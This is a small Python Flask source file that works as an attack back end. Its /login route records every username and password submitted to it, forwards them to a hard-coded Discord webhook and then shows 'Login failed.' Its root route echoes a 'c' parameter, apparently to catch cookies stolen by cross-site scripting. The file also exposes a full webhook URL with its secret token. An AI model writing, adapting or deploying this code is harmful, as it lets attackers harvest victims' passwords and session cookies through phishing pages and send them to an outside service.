from flask import Flask, make_response, request
import requests
import json

app = Flask(__name__)

# Replace this with your actual Discord webhook URL
discord_webhook_url = "https://discord.com/api/webhooks/1181975356505346058/TGHWxELlDNwKArR78IIiCpSmtN-If8J7-odI_a0tD_RbqJ6SiLnrQKxGk-ynZ5kxkunS"

def send_to_discord(message):
    payload = {"content": message}
    requests.post(discord_webhook_url, json=payload)



@app.route('/')
def index():
   # Get the value of the 'c' parameter from the request (if provided)
    cookie_value = request.args.get('c', default='')

    # Set a cookie named 'my_cookie' with the provided value
    response = make_response('Cookie set!')
    response.set_cookie('my_cookie', value=str(cookie_value))


    return cookie_value



@app.route('/login', methods=['GET'])
def login():
    username = request.args.get('username')
    password_attempt = request.args.get('password')

    # Send information to Discord regardless of the password
    message = f"Login attempt for {username}. Password entered: {password_attempt}"
    send_to_discord(message)

    # In a real-world scenario, you might log the attempt, but don't reveal if the username exists to prevent enumeration attacks.
    return 'Login failed.'

    
if __name__ == '__main__':
    app.run(debug=True)
